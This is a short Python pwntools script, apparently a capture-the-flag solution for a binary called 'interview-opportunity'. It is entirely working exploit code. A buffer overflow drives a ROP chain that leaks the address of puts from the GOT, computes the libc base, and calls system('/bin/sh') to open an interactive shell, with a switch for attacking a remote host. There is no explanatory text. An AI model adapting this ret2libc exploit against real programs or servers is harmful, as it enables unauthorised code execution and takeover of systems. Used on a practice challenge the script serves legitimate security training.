from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main
continue
'''.format(**locals())

exe = './challenge/interview-opportunity'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

pop_rdi_ret = 0x0000000000401313
pop_rsi_r15_ret = 0x0000000000401311
ret = 0x000000000040101a

p = start()
payload = flat(
    cyclic(34),
    pop_rdi_ret,
    elf.got.puts,
    elf.plt.puts,
    elf.entrypoint
)

p.sendline(payload)
p.recvuntil(b'\x13\x13@\n')
leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info("Leak got puts: " + hex(leak))

libc.address = leak - libc.sym[b'puts']
payload = flat(
    cyclic(34),
    pop_rdi_ret,
    next(libc.search(b"/bin/sh")),
    ret,
    libc.sym[b"system"]
)

p.sendline(payload)
p.interactive()
